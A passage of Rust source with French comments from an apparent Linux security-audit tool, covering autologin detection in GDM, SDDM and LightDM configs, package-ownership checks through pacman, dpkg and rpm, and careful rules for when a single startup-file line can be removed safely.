fn lire_fichier_de_connexion(chemin: &Path) -> Lu {
    use std::io::Read;
    match std::fs::metadata(chemin) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Lu::Absent,
        Err(_) => return Lu::Present(None),
        Ok(m) if !m.is_file() || m.len() > CONNEXION_OCTETS_MAX => return Lu::Present(None),
        Ok(_) => {}
    }
    let mut octets = Vec::new();
    let lu = std::fs::File::open(chemin)
        .and_then(|f| f.take(CONNEXION_OCTETS_MAX.saturating_add(1)).read_to_end(&mut octets))
        .is_ok_and(|n| u64::try_from(n).is_ok_and(|n| n <= CONNEXION_OCTETS_MAX));
    Lu::Present(lu.then(|| String::from_utf8(octets).ok()).flatten())
}

/// Fichiers des gestionnaires de connexion sous `racine` (« / » au bilan), dans l'ordre où chacun les applique (le
/// dernier l'emporte) :
/// - GDM : custom.conf (Ubuntu, Fedora) et daemon.conf (Debian) ;
/// - SDDM : TOUS les fichiers (quel que soit leur nom) de /usr/lib/sddm/sddm.conf.d, puis de /etc/sddm.conf.d, puis
///   /etc/sddm.conf ;
/// - LightDM : les « .conf » de /usr/share, /usr/local/share, /etc/xdg (XDG_CONFIG_DIRS par défaut), puis
///   /etc/lightdm/lightdm.conf.d, puis /etc/lightdm/lightdm.conf.
///
/// Un fichier ou un dossier qui existe mais ne se lit pas y est, sans texte : ronde 10 du lot 096 (N10-4), avant il
/// était sauté sans rien dire, et une ouverture automatique posée là était comptée saine. Un sous-dossier est sauté
/// (ni SDDM ni LightDM ne le lisent).
fn fichiers_de_connexion(racine: &Path) -> Vec<FichierDeConnexion> {
    let sous = |c: &str| racine.join(c.trim_start_matches('/'));
    let mut fichiers: Vec<FichierDeConnexion> = Vec::new();
    let fichier = |g: Gestionnaire, p: &Path, fichiers: &mut Vec<FichierDeConnexion>| {
        if let Lu::Present(texte) = lire_fichier_de_connexion(p) {
            fichiers.push(FichierDeConnexion {
                gestionnaire: g,
                chemin: p.to_string_lossy().into_owned(),
                texte,
            });
        }
    };
    let dossier = |g: Gestionnaire, d: &Path, conf_seuls: bool, fichiers: &mut Vec<FichierDeConnexion>| {
        let illisible = |fichiers: &mut Vec<FichierDeConnexion>| {
            fichiers.push(FichierDeConnexion {
                gestionnaire: g,
                chemin: d.to_string_lossy().into_owned(),
                texte: None,
            });
        };
        let entrees = match std::fs::read_dir(d) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => return illisible(fichiers),
            Ok(e) => e,
        };
        let mut noms: Vec<PathBuf> = Vec::new();
        for entree in entrees {
            let Ok(entree) = entree else {
                return illisible(fichiers);
            };
            let p = entree.path();
            if conf_seuls && !entree.file_name().as_encoded_bytes().ends_with(b".conf") {
                continue;
            }
            if std::fs::metadata(&p).is_ok_and(|m| m.is_dir()) {
                continue;
            }
            noms.push(p);
            if noms.len() > CONNEXION_FICHIERS_MAX {
                return illisible(fichiers);
            }
        }
        noms.sort_by(|a, b| a.as_os_str().as_encoded_bytes().cmp(b.as_os_str().as_encoded_bytes()));
        for p in noms {
            // Disparu entre la liste et la lecture : non vérifié, jamais compté comme absent.
            fichiers.push(FichierDeConnexion {
                gestionnaire: g,
                chemin: p.to_string_lossy().into_owned(),
                texte: match lire_fichier_de_connexion(&p) {
                    Lu::Present(texte) => texte,
                    Lu::Absent => None,
                },
            });
        }
    };
    for c in ["/etc/gdm/custom.conf", "/etc/gdm3/custom.conf", "/etc/gdm3/daemon.conf"] {
        fichier(Gestionnaire::Gdm, &sous(c), &mut fichiers);
    }
    dossier(
        Gestionnaire::Sddm,
        &sous("/usr/lib/sddm/sddm.conf.d"),
        false,
        &mut fichiers,
    );
    dossier(Gestionnaire::Sddm, &sous("/etc/sddm.conf.d"), false, &mut fichiers);
    fichier(Gestionnaire::Sddm, &sous("/etc/sddm.conf"), &mut fichiers);
    for d in [
        "/usr/share/lightdm/lightdm.conf.d",
        "/usr/local/share/lightdm/lightdm.conf.d",
        "/etc/xdg/lightdm/lightdm.conf.d",
        "/etc/lightdm/lightdm.conf.d",
    ] {
        dossier(Gestionnaire::LightDm, &sous(d), true, &mut fichiers);
    }
    fichier(Gestionnaire::LightDm, &sous("/etc/lightdm/lightdm.conf"), &mut fichiers);
    fichiers
}

/// Session qui s'ouvre toute seule : sans disque chiffré, un ordinateur volé s'allume directement sur les fichiers.
/// Avec un disque chiffré (Omarchy), le mot de passe du disque protège : c'est dit, sans alerte.
fn ouverture_automatique() -> Option<Constat> {
    constat_d_ouverture(&fichiers_de_connexion(Path::new("/")), racine_chiffree)
}

/// Combien de fichiers non lus un constat d'ouverture automatique nomme au plus ; les autres sont comptés.
const NON_LUS_MONTRES: usize = 5;

/// Le constat d'ouverture automatique d'après `fichiers` (`fichiers_de_connexion`) ; `None` : personne, et tout a été
/// lu. Un fichier qui ne s'est pas lu est dit non vérifié (ronde 10 du lot 096, N10-4), jamais compté comme sain ; une
/// ouverture annulée d'une façon que Vanguard ne sait pas confirmer aussi (ronde 11, N11-2, `annulations_non_sures`).
fn constat_d_ouverture(fichiers: &[FichierDeConnexion], chiffree: impl FnOnce() -> Option<bool>) -> Option<Constat> {
    let douteuses: Vec<String> = annulations_non_sures(fichiers)
        .iter()
        .take(NON_LUS_MONTRES)
        .map(|f| crate::ui::affichable(f))
        .collect();
    let douteuses = douteuses.join(", ");
    let non_lus: Vec<String> = fichiers
        .iter()
        .filter(|f| f.texte.is_none())
        .map(|f| crate::ui::affichable(&f.chemin))
        .collect();
    let mut montres: Vec<String> = non_lus.iter().take(NON_LUS_MONTRES).cloned().collect();
    let autres = non_lus.len().saturating_sub(NON_LUS_MONTRES);
    if autres > 0 {
        montres.push(trf!("et {autres} autre(s)", "and {autres} more"));
    }
    let montres = montres.join(", ");
    match ouverture_automatique_de(fichiers) {
        Some((compte, fichier)) => {
            let mut c = juger_ouverture_automatique(&compte, &fichier, chiffree());
            if !non_lus.is_empty() {
                c.message.push_str(&trf!(
                    " Fichiers du gestionnaire de connexion qui ne se lisent pas, non vérifiés : {montres}.",
                    " Login manager files that cannot be read, not checked: {montres}."
                ));
            }
            if !douteuses.is_empty() {
                c.message.push_str(&trf!(
                    " Ouverture automatique annulée d'une façon non vérifiée, dans : {douteuses}.",
                    " Automatic login cancelled in a way not checked, in: {douteuses}."
                ));
            }
            Some(c)
        }
        None if non_lus.is_empty() && douteuses.is_empty() => None,
        None => {
            let mut raisons = Vec::new();
            if !non_lus.is_empty() {
                raisons.push(trf!(
                    "des fichiers du gestionnaire de connexion ne se lisent pas, {montres}",
                    "some login manager files cannot be read, {montres}"
                ));
            }
            if !douteuses.is_empty() {
                raisons.push(trf!(
                    "une ouverture posée dans {douteuses} est annulée par une ligne que le gestionnaire ne lit peut-être pas, ou pas dans cet ordre (autre fichier, autre section)",
                    "a login set in {douteuses} is cancelled by a line the login manager may not read, or not in that order (other file, other section)"
                ));
            }
            Some(impossible(
                "Comptes",
                &trf!(
                    "ouverture automatique de session : {}",
                    "automatic login: {}",
                    raisons.join(" ; ")
                ),
            ))
        }
    }
}

/// Le constat d'une session qui s'ouvre toute seule. La correction reste à la main (ronde 10 du lot 096, N10-3) :
/// GDM, SDDM et LightDM lisent plusieurs fichiers, chacun à sa façon (SDDM n'est pas lu par GLib), et retirer la ligne
/// vue pourrait laisser, ou réveiller, celle d'un autre fichier.
fn juger_ouverture_automatique(compte: &str, fichier: &str, chiffree: Option<bool>) -> Constat {
    let compte = crate::ui::affichable(compte);
    let fichier = crate::ui::affichable(fichier);
    if chiffree == Some(true) {
        return ok(
            "Comptes",
            trf!(
                "La session de « {compte} » s'ouvre toute seule, derrière le mot de passe du disque chiffré.",
                "“{compte}”'s session opens by itself, behind the encrypted disk's password."
            ),
        );
    }
    alerte(
        "Comptes",
        Niveau::Moyen,
        trf!(
            "La session de « {compte} » s'ouvre toute seule au démarrage, sans disque chiffré : un ordinateur volé s'allume directement sur vos fichiers.",
            "“{compte}”'s session opens by itself at startup, without an encrypted disk: a stolen computer boots straight into your files."
        ),
    )
    .manuel(
        trf!(
            "Couper l'ouverture automatique : réglages des utilisateurs du bureau (GNOME : Paramètres > Utilisateurs ; KDE : Écran de connexion), ou la ligne du compte dans {fichier}. Vanguard ne la retire pas lui-même : le gestionnaire de connexion lit plusieurs fichiers, et une ligne d'un autre fichier pourrait reprendre la main.",
            "Turn off automatic login: the desktop's user settings (GNOME: Settings > Users; KDE: Login Screen), or the account's line in {fichier}. Vanguard does not remove it itself: the login manager reads several files, and a line in another file could take over."
        ),
        &[],
    )
}

/// Ce que le gestionnaire de paquets dit d'un fichier, pour un geste de défense (`machine::defense_eleve`) : à aucun
/// paquet, à un paquet et intact, à un paquet et modifié depuis son installation, ou illisible (gestionnaire inconnu,
/// base qui ne se lit pas, empreinte absente). « Illisible » n'est jamais compté comme « aucun » : le geste est refusé.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum EtatPaquet {
    Aucun,
    Intact(String),
    Modifie(String),
    Illisible,
}

/// Le paquet de `fichier` (chemin réel, déjà revu) et s'il a changé. pacman et dpkg par leur base lue directement,
/// rpm par sa commande (chemin du système, environnement vidé, en anglais) : seule sa phrase « is not owned by any
/// package » dit « aucun » ; tout autre échec est illisible.
pub(crate) fn etat_paquet(fichier: &Path) -> EtatPaquet {
    let Some(p) = Paquets::detecter() else {
        return EtatPaquet::Illisible;
    };
    let proprietaire = match p {
        Paquets::Pacman | Paquets::Apt => {
            let lire: fn(&[&Path]) -> Proprietaires = if p == Paquets::Pacman {
                natif::proprietaire_pacman
            } else {
                proprietaire_dpkg
            };
            match proprietaires_selon(&[fichier.to_path_buf()], lire) {
                Some(mut v) => v.pop().flatten(),
                None => return EtatPaquet::Illisible,
            }
        }
        Paquets::Dnf | Paquets::Zypper => {
            let mut trouve = proprietaire_rpm(fichier);
            if trouve == Ok(None)
                && let Some(ancien) = chemin_hors_usr(fichier)
            {
                trouve = proprietaire_rpm(&ancien);
            }
            match trouve {
                Ok(n) => n,
                Err(()) => return EtatPaquet::Illisible,
            }
        }
    };
    let Some(nom) = proprietaire else {
        return EtatPaquet::Aucun;
    };
    match p.modifies(&nom, &[fichier.to_path_buf()]).pop().flatten() {
        Some(true) => EtatPaquet::Modifie(nom),
        Some(false) => EtatPaquet::Intact(nom),
        None => EtatPaquet::Illisible,
    }
}

/// `rpm -qf` d'un fichier : `Ok(None)` seulement sur la phrase de rpm qui dit qu'aucun paquet ne l'a.
fn proprietaire_rpm(fichier: &Path) -> Result<Option<String>, ()> {
    let r = crate::commande::outil_propre("rpm")
        .and_then(|mut c| {
            crate::commande::lancer(
                c.args(["-qf", "--qf", "%{NAME}\\n"]).arg(fichier).env("LC_ALL", "C"),
                60,
            )
        })
        .ok_or(())?;
    lecture_rpm(r.code, &r.sortie, &r.erreurs)
}

fn lecture_rpm(code: Option<i32>, sortie: &str, erreurs: &str) -> Result<Option<String>, ()> {
    match code {
        Some(0) => sortie
            .lines()
            .next()
            .map(str::trim)
            .filter(|n| !n.is_empty() && n.bytes().all(|o| o.is_ascii_graphic()))
            .map(|n| Some(n.to_string()))
            .ok_or(()),
        Some(1)
            if sortie.contains("is not owned by any package") || erreurs.contains("is not owned by any package") =>
        {
            Ok(None)
        }
        _ => Err(()),
    }
}

/// Pourquoi une ligne ne se retire pas seule (`AnalyseDeRetrait::decoupe`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Decoupe {
    /// Elle, ou celle d'avant, finit par « \ » : le shell, systemd et pam_env la joignent à la suivante.
    Barre,
    /// Dans un fichier lu par un shell : elle n'est pas de la forme « `[export ]NOM=valeur` » la plus simple, ou le
    /// fichier n'est pas fait que de lignes vides, de commentaires entiers et de telles affectations, chaque NOM une
    /// fois (`AnalyseDeRetrait::decoupe`, ronde 7 du lot 096).
    Shell,
    /// Le fichier a plus de `RETRAIT_LIGNES_MAX` lignes ou de `RETRAIT_OCTETS_MAX` octets : rien n'est jugé, le
    /// retrait est refusé.
    Trop,
    /// Une ligne du fichier a plus de `LIGNE_OCTETS_MAX` octets : un lecteur à tampon fixe peut s'y arrêter ou la
    /// couper (ronde 8 du lot 096, N8-1).
    Longue,
    /// Un fichier que le système lance lui-même (/etc/rc.local) dont la ligne « #! » ne nomme pas sh ou bash : pour un
    /// autre interpréteur, « NOM=valeur » n'est pas une affectation (ronde 8 du lot 096, N8-3).
    Interprete,
    /// Un fichier d'un gestionnaire de connexion (GDM, SDDM, LightDM) : Vanguard n'y retire ni n'y commente jamais une
    /// ligne seul (ronde 10 du lot 096, N10-3 et N10-4). Chacun lit ses fichiers à sa façon (SDDM n'est pas lu par
    /// GLib : il ôte tous les blancs Unicode autour d'une clé, ne rejette jamais un fichier), en lit plusieurs (SDDM :
    /// tous les fichiers de ses dossiers, quel que soit leur nom), et la dernière valeur gagne : retirer la ligne vue
    /// peut laisser, ou réveiller, celle d'un autre fichier ou d'une autre clé, que la question ne montre pas.
    Connexion,
    /// Une unité systemd (et ses fichiers .d/*.conf), un fichier de cron ou d'anacron, un raccourci .desktop : Vanguard
    /// n'y retire jamais une ligne seul (ronde 9 du lot 096, N9-1 et N9-2). Une ligne y peut en retenir une autre, quelle
    /// que soit sa forme : « ExecStartPre= » ou « ExecCondition= » qui échoue empêche « ExecStart= », « User= » ou
    /// « Condition…= » aussi ; « SHELL= », « PATH= » ou « HOME= » d'un fichier de cron fait échouer les tâches qui
    /// suivent. La retirer réveillerait ce qu'elle retenait, sans le montrer.
    Format,
    /// La ligne n'est pas de celles que Vanguard retire (ou commente) lui-même (`AnalyseDeRetrait::ligne_offerte`) :
    /// pour un retrait, hors d'une affectation de LD_PRELOAD ou de LD_AUDIT qui précharge vraiment ; pour un
    /// commentaire de proxy, hors d'une ligne de proxy (ronde 9 du lot 096, N9-3 : le fils root et le bilan en jugent
    /// par la même fonction, `retrait_refuse` ou `proxy_refuse`).
    Hors,
}

/// Au plus autant d'octets dans chaque ligne d'un fichier dont Vanguard juge le retrait d'une ligne seule ; au-delà,
/// refus (`Decoupe::Longue`). Ronde 8 du lot 096 (N8-1) : pam_env de Linux-PAM 1.4.0 à 1.5.3 arrête la lecture de
/// /etc/environment, sans erreur, à une ligne de 8 191 octets ou plus (tampon fixe) ; retirer cette ligne réveillerait
/// les suivantes. Bien sous les tampons connus : pam_env 1.3 (1 024, ligne coupée en morceaux) et cron de Debian
/// (1 000 pour une variable ou une commande).
pub(crate) const LIGNE_OCTETS_MAX: usize = 1000;

/// Comment le lecteur d'un fichier admis le lit, pour juger le retrait d'une ligne seule (`AnalyseDeRetrait`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LecteurDeLignes {
    /// Un shell, pam_env ou le générateur environment.d de systemd : règle du fichier d'affectations simples.
    Shell,
    /// Un fichier d'un gestionnaire de connexion (GDM, SDDM, LightDM). Jamais de retrait ni de commentaire
    /// automatique (`Decoupe::Connexion`, ronde 10 du lot 096) : la règle stricte des rondes 8 et 9 jugeait une ligne
    /// d'un seul fichier, comme GLib la lit ; SDDM n'est pas GLib, et chacun en lit plusieurs.
    Connexion,
    /// Les autres fichiers lus ligne par ligne (`lu_ligne_par_ligne`) : unités systemd et leurs .d/*.conf, cron,
    /// anacron, .desktop. Jamais de retrait automatique (`Decoupe::Format`).
    Format,
}

impl LecteurDeLignes {
    /// Le lecteur de `fichier`, jugé sur son nom et ceux de ses dossiers exacts, comme `lu_ligne_par_ligne`.
    /// Un fichier de gestionnaire de connexion d'abord, quel que soit son nom dans les dossiers « sddm.conf.d » et
    /// « lightdm.conf.d » (SDDM les lit tous : ronde 10, N10-4) : un refus de trop laisse le geste à la main.
    fn de(fichier: &str) -> Self {
        let mut parties = fichier.rsplit('/');
        let nom = parties.next().unwrap_or(fichier);
        let parent = parties.next().unwrap_or("");
        if (parent == "etc" && nom == "sddm.conf")
            || (["gdm", "gdm3"].contains(&parent) && ["custom.conf", "daemon.conf"].contains(&nom))
            || (parent == "lightdm" && nom == "lightdm.conf")
            || ["sddm.conf.d", "lightdm.conf.d"].contains(&parent)
        {
            Self::Connexion
        } else if lu_ligne_par_ligne(fichier) {
            Self::Format
        } else {
            Self::Shell
        }
    }
}

/// Au plus autant de lignes dans un fichier dont Vanguard juge le retrait d'une ligne seule ; au-delà, rien n'est
/// jugé et le retrait est refusé (`Decoupe::Trop`), jamais admis. Le jugement est linéaire (ronde 5 du lot 096, N1),
/// mais la borne est dite : un fichier de démarrage n'a jamais tant de lignes, et un fichier qui les a est lui-même
/// suspect.
pub(crate) const RETRAIT_LIGNES_MAX: usize = 100_000;

#[cfg(test)]
thread_local! {
    /// Les pas du jugement des retraits (une ligne découpée, un numéro jugé) : un essai tient ainsi que le coût reste
    /// linéaire (ronde 5 du lot 096, N1 : avant, 800 lignes pareilles coûtaient N⁴, 30 s).
    pub(crate) static PAS_DE_RETRAIT: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

/// Un pas du jugement des retraits, compté dans les essais (`PAS_DE_RETRAIT`).
fn pas_de_retrait() {
    #[cfg(test)]
    PAS_DE_RETRAIT.with(|p| p.set(p.get().saturating_add(1)));
}

/// Retirer de `fichier`, de contenu `contenu`, ses lignes `numeros` (depuis 0, coupées au seul « \n ») changerait-il
/// le sens d'une AUTRE ligne ? (`AnalyseDeRetrait::decoupe`, sans juger la ligne elle-même : pour les essais.)
#[cfg(test)]
pub(crate) fn retrait_decoupe(fichier: &str, contenu: &[u8], numeros: &[usize]) -> Option<Decoupe> {
    AnalyseDeRetrait::de(fichier, contenu).decoupe(numeros)
}

/// Pourquoi Vanguard ne retire pas lui-même de `fichier`, de contenu `contenu`, la ligne `ligne`, écrite aux numéros
/// `numeros` (depuis 0, coupées au seul « \n ») ; `None` : il la retire. La seule règle, au bilan (le geste n'est pas
/// offert, la raison est dite) comme au fils root (refusé même si on le lui demande, rien d'écrit) : ronde 9 du lot
/// 096 (N9-3), le fils root n'admet que ce que le bilan offre. /etc/ld.so.preload se juge à part, sur le fichier
/// entier (`machine::prechargement`).
pub(crate) fn retrait_refuse(fichier: &str, contenu: &[u8], ligne: &[u8], numeros: &[usize]) -> Option<Decoupe> {
    AnalyseDeRetrait::de(fichier, contenu).refus(ligne, numeros)
}

/// Pourquoi Vanguard ne met pas lui-même en commentaire, dans `fichier`, la ligne de proxy `ligne` (geste
/// `CommenterProxy`) ; `None` : il la commente. La même règle que `retrait_refuse`, au bilan (`reparer`, le geste n'est
/// pas offert) comme au fils root (refusé même si on le lui demande) : ronde 10 du lot 096 (N10-1). Avant, ce geste ne
/// vérifiait que la forme de la ligne ; le commentaire d'une ligne qui ouvre un guillemet, d'une ligne d'unité, de cron
/// ou de gestionnaire de connexion réveillait ce qu'elle retenait.
pub(crate) fn proxy_refuse(fichier: &str, contenu: &[u8], ligne: &[u8], numeros: &[usize]) -> Option<Decoupe> {
    AnalyseDeRetrait::de(fichier, contenu).refus_de_proxy(ligne, numeros)
}

/// Ce que Vanguard fait d'une ligne seule : la retirer (`RetirerLigne`) ou la mettre en commentaire (`CommenterProxy`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Retouche {
    Retirer,
    CommenterProxy,
}

/// Les variables de proxy qu'une affectation simple peut poser pour que Vanguard la commente (en majuscules :
/// `affectation_simple` refuse tout NOM qui porte une minuscule).
const NOMS_DE_PROXY: [&[u8]; 4] = [b"HTTP_PROXY", b"HTTPS_PROXY", b"FTP_PROXY", b"ALL_PROXY"];

/// Les fichiers admis dont le lecteur coupe strictement ligne par ligne (hors « \ » final) : un guillemet ou un « << »
/// n'y relie pas deux lignes. Jugé sur le nom du fichier et ceux de ses dossiers exacts (pour valoir aussi sous la
/// racine d'un essai), jamais sur un bout du chemin : un script de shell rangé sous /etc/gdm/ (PostSession/Default)
/// reste du shell (ronde 5 du lot 096, N3). Ce qui n'est pas reconnu ici est jugé comme du shell : un refus de trop
/// laisse le geste à la main, jamais un sens changé sans le montrer.
fn lu_ligne_par_ligne(fichier: &str) -> bool {
    let mut parties = fichier.rsplit('/');
    let nom = parties.next().unwrap_or(fichier);
    let parent = parties.next().unwrap_or("");
    let aieul = parties.next().unwrap_or("");
    let unite = [".service", ".timer", ".socket", ".path", ".target", ".mount"];
    // Les noms de systemd et des gestionnaires de connexion sont sensibles à la casse : « X.CONF » n'est pas lu.
    let conf = nom
        .rsplit_once('.')
        .is_some_and(|(avant, ext)| !avant.is_empty() && ext == "conf");
    nom.ends_with(".desktop")
        || unite.iter().any(|f| nom.ends_with(f))
        || (parent == "etc" && ["crontab", "anacrontab", "sddm.conf"].contains(&nom))
        || (parent == "cron.d" && aieul == "etc")
        || (["gdm", "gdm3"].contains(&parent) && ["custom.conf", "daemon.conf"].contains(&nom))
        || (parent == "lightdm" && nom == "lightdm.conf")
        || (["sddm.conf.d", "lightdm.conf.d"].contains(&parent) && conf)
        || (unite
            .iter()
            .any(|u| parent.strip_suffix(".d").is_some_and(|p| p.ends_with(u)))
            && conf)
}

/// Les variables que le shell (bash, sh, zsh, ksh) lit lui-même, met lui-même, ou garde en lecture seule : une ligne
/// qui en pose une ne se retire jamais seule. Son retrait changerait d'autres lignes, ou du code lu après le fichier,
/// sans qu'elles la nomment (« IFS=x » retiré réveille une ligne : ronde 6 du lot 096) ; et une affectation à une
/// variable en lecture seule échoue, ce qui arrête la lecture du fichier en mode POSIX, sous « set -e » ou dans une
/// fonction (« UID=1 » sous `sh` : ronde 7, R7-3, rejoué avec bash 5.3). En zsh, UID, EUID, GID, EGID et USERNAME
/// changent l'identité du shell. Celles qui commencent par un préfixe de `PREFIXES_DU_SHELL` aussi. Un NOM qui porte
/// une minuscule est refusé à part (`affectation_simple`) : zsh lie des tableaux en minuscules à ses variables
/// (« path », « status », « aliases »…).
const NOMS_DU_SHELL: [&[u8]; 118] = [
    b"_",
    b"IFS",
    b"PATH",
    b"ENV",
    b"CDPATH",
    b"HOME",
    b"PWD",
    b"OLDPWD",
    b"LANG",
    b"LANGUAGE",
    b"TEXTDOMAIN",
    b"TEXTDOMAINDIR",
    b"OPTIND",
    b"OPTARG",
    b"OPTERR",
    b"PS0",
    b"PS1",
    b"PS2",
    b"PS3",
    b"PS4",
    b"PSVAR",
    b"UID",
    b"EUID",
    b"GID",
    b"EGID",
    b"PPID",
    b"USERNAME",
    b"LOGNAME",
    b"GROUPS",
    b"LINENO",
    b"RANDOM",
    b"SRANDOM",
    b"SECONDS",
    b"EPOCHREALTIME",
    b"EPOCHSECONDS",
    b"FUNCNAME",
    b"FUNCNEST",
    b"DIRSTACK",
    b"DIRSTACKSIZE",
    b"PIPESTATUS",
    b"REPLY",
    b"MAPFILE",
    b"COPROC",
    b"SHLVL",
    b"HOST",
    b"HOSTNAME",
    b"HOSTTYPE",
    b"HOSTFILE",
    b"MACHTYPE",
    b"OSTYPE",
    b"CPUTYPE",
    b"VENDOR",
    b"GLOBIGNORE",
    b"GLOBSORT",
    b"POSIXLY_CORRECT",
    b"EXECIGNORE",
    b"TMOUT",
    // « D » échappé : la garde des essais sur le dossier temporaire (menu::tests) compte ce nom entre guillemets.
    b"TMP\x44IR",
    b"TMPPREFIX",
    b"TIMEFORMAT",
    b"TIMEFMT",
    b"IGNOREEOF",
    b"INPUTRC",
    b"MAIL",
    b"MAILCHECK",
    b"MAILPATH",
    b"CHILD_MAX",
    b"COLUMNS",
    b"LINES",
    b"FCEDIT",
    b"FIGNORE",
    b"EMACS",
    b"INSIDE_EMACS",
    b"TERM",
    b"TERMINFO",
    b"TERMINFO_DIRS",
    b"BASH",
    b"BASHOPTS",
    b"BASHPID",
    b"FPATH",
    b"MANPATH",
    b"MODULE_PATH",
    b"ZDOTDIR",
    b"ARGC",
    b"ARGV0",
    b"ERRNO",
    b"TTY",
    b"TTYIDLE",
    b"WATCH",
    b"WATCHFMT",
    b"LOGCHECK",
    b"KEYBOARD_HACK",
    b"KEYTIMEOUT",
    b"NULLCMD",
    b"READNULLCMD",
    b"LISTMAX",
    b"PERIOD",
    b"POSTEDIT",
    b"RPS1",
    b"RPS2",
    b"SAVEHIST",
    b"SPROMPT",
    b"STTY",
    b"TRY_BLOCK_ERROR",
    b"TRY_BLOCK_INTERRUPT",
    b"WORDCHARS",
    b"CORRECT_IGNORE",
    b"CORRECT_IGNORE_FILE",
    b"REPORTTIME",
    b"REPORTMEMORY",
    // Ronde 8 (N8-2) : bash lit TERMCAP (il en tire COLUMNS et LINES, en interactif) et TZ (l'heure de ses invites et
    // de « printf %(…)T »).
    b"TERMCAP",
    b"TZ",
    // Ronde 8 (N8-3) : en lecture seule dans mksh (non essayé : mksh absent ; lu dans son manuel).
    b"KSHUID",
    b"KSHGID",
    b"KSHEGID",
    b"USER_ID",
    b"PGRP",
    b"KSH_VERSION",
];

/// Les débuts de NOM que le shell se réserve (`NOMS_DU_SHELL`) : « BASH_ » (BASH_ENV, BASH_ALIASES, BASH_XTRACEFD…),
/// « LC_ » (la langue : découpe des mots, classes de caractères), « SHELL » (SHELL, SHELLOPTS), « ZSH », « ZLE »,
/// « COMP », « READLINE_ », « HIST » (HISTFILE, HISTCMD…), « PROMPT » et « RPROMPT ».
const PREFIXES_DU_SHELL: [&[u8]; 10] = [
    b"BASH_",
    b"LC_",
    b"SHELL",
    b"ZSH",
    b"ZLE",
    b"COMP",
    b"READLINE_",
    b"HIST",
    b"PROMPT",
    b"RPROMPT",
];

/// Les octets admis dans la valeur d'une affectation de la forme la plus simple (`affectation_simple`) : lettres et
/// chiffres ASCII et « / . _ - : + , = @ % », qui ne sont spéciaux pour aucun shell dans une affectation.
fn octet_simple(o: u8) -> bool {
    o.is_ascii_alphanumeric() || b"/._-:+,=@%".contains(&o)
}

/// Un blanc au sens de cette règle : l'espace et la tabulation seulement (pas « \r », ni le saut de page, que bash
/// ne compte pas comme des blancs : ronde 7 du lot 096, R7-1).
fn blanc(o: u8) -> bool {
    o == b' ' || o == b'\t'
}

/// La ligne est-elle une affectation de la forme la plus simple, « `[export ]NOM=valeur` » ? Le NOM qu'elle pose, sinon
/// `None`. Admis, et rien d'autre (ronde 7 du lot 096) :
/// - des blancs (`blanc`) en tête ; « export » suivi de blancs ;
/// - un NOM de majuscules ASCII, chiffres et « _ », pas en tête un chiffre, hors `NOMS_DU_SHELL` et
///   `PREFIXES_DU_SHELL` ;
/// - « = » collé, puis une valeur faite de `octet_simple` (peut-être vide), sans « = » en tête ni après un « : »
///   (zsh), ou tout entière entre guillemets simples dont le dedans n'a que des `octet_simple` et des blancs ;
/// - puis des blancs seulement : ni commentaire, ni seconde commande, ni « \r ».
///
/// Une telle ligne ne lit rien, ne lance rien, n'ouvre rien que la ligne d'après pourrait continuer, rend toujours 0,
/// et pose une variable que le shell ne lit pas pour lui-même.
fn affectation_simple(ligne: &[u8]) -> Option<&[u8]> {
    let sans_blancs = |r: &'_ [u8]| -> usize { r.iter().position(|o| !blanc(*o)).unwrap_or(r.len()) };
    let mut reste = ligne.get(sans_blancs(ligne)..)?;
    if let Some(apres) = reste.strip_prefix(b"export")
        && apres.first().is_some_and(|o| blanc(*o))
    {
        reste = apres.get(sans_blancs(apres)..)?;
    }
    let fin_du_nom = reste
        .iter()
        .position(|o| !(o.is_ascii_uppercase() || o.is_ascii_digit() || *o == b'_'))?;
    let (nom, apres) = reste.split_at(fin_du_nom);
    if nom.first().is_none_or(u8::is_ascii_digit)
        || NOMS_DU_SHELL.contains(&nom)
        || PREFIXES_DU_SHELL.iter().any(|p| nom.starts_with(p))
    {
        return None;
    }
    let valeur = apres.strip_prefix(b"=")?;
    let fin_de_valeur = if let Some(dedans) = valeur.strip_prefix(b"'") {
        let fin = dedans.iter().position(|o| *o == b'\'')?;
        if !dedans.iter().take(fin).all(|o| octet_simple(*o) || blanc(*o)) {
            return None;
        }
        fin.saturating_add(2)
    } else {
        // zsh développe « =commande » en tête d'une valeur, et après un « : » (EQUALS) ; une commande absente y est
        // une erreur qui arrête le fichier : retirer la ligne réveillerait la suite.
        if valeur.starts_with(b"=") || valeur.windows(2).any(|d| d == b":=") {
            return None;
        }
        valeur.iter().position(|o| !octet_simple(*o)).unwrap_or(valeur.len())
    };
    valeur.get(fin_de_valeur..)?.iter().all(|o| blanc(*o)).then_some(nom)
}

/// La ligne est-elle vide (des blancs seulement) ou un commentaire entier (« # » après des blancs, sans octet de
/// contrôle autre que la tabulation) ?
fn vide_ou_commentaire(ligne: &[u8]) -> bool {
    let debut = ligne.iter().position(|o| !blanc(*o)).unwrap_or(ligne.len());
    match ligne.get(debut..).unwrap_or_default() {
        [] => true,
        [b'#', reste @ ..] => !reste.iter().any(|o| (*o < 0x20 && *o != b'\t') || *o == 0x7f),
        _ => false,
    }
}

/// Les interpréteurs admis sur la ligne « #! » d'un fichier que le système lance lui-même (`AnalyseDeRetrait`) : ceux
/// qui lisent « NOM=valeur » comme une affectation, et que les rondes 6 à 8 ont essayés (bash et sh).
const INTERPRETES_ADMIS: [&[u8]; 4] = [b"/bin/sh", b"/usr/bin/sh", b"/bin/bash", b"/usr/bin/bash"];

/// Le fichier est-il de ceux que le système lance lui-même au lieu de les faire lire par un shell (/etc/rc.local,
/// lancé par rc-local.service ou le script d'init) ? Sa ligne « #! » choisit alors son lecteur (ronde 8 du lot 096,
/// N8-3). Jugé sur le nom et le dossier exacts, comme `lu_ligne_par_ligne`.
fn lance_par_le_systeme(fichier: &str) -> bool {
    let mut parties = fichier.rsplit('/');
    parties.next() == Some("rc.local") && parties.next() == Some("etc")
}

/// La première ligne de `contenu` est-elle « #! » suivi d'un interpréteur de `INTERPRETES_ADMIS`, sans option ou de la
/// seule option « -e » (le rc.local de Debian), puis de blancs seulement ? Sans « #! », le lanceur décide : systemd
/// échoue, un shell lit le fichier lui-même ; trop d'incertitude, la réponse est non.
